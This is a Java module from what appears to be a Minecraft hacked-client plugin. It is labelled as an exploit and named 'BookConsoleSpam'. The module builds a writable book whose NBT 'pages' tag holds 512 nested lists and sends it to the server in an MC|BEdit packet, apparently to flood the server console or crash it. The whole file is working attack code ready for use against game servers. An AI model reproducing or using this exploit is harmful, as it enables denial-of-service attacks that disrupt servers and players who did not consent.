package io.github.famous1622.gladiator.modules;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import me.rigamortis.seppuku.api.module.Module;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

public class BookConsoleSpamModule extends Module {
    private NBTTagCompound theTag = new NBTTagCompound();

    public BookConsoleSpamModule() {
        super("BookConsoleSpam", new String[]{"bcs"}, "512 is the magic number", "NONE", -1, ModuleType.EXPLOIT);
        NBTTagList theList = new NBTTagList();
        for (int i = 0; i < 512; i++) {
            NBTTagList a = new NBTTagList();
            a.appendTag(theList);
            theList = a;
        }
        theTag.setTag("pages", theList);
    }

    @Listener
    public void onEnable() {
        if (mc.world != null) {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            ItemStack theBook = new ItemStack(Items.WRITABLE_BOOK, 1);
            theBook.setTagCompound(theTag);
            buffer.writeItemStack(theBook);
            mc.player.connection.sendPacket(new CPacketCustomPayload("MC|BEdit", buffer));
        }
        toggle();
    }
}
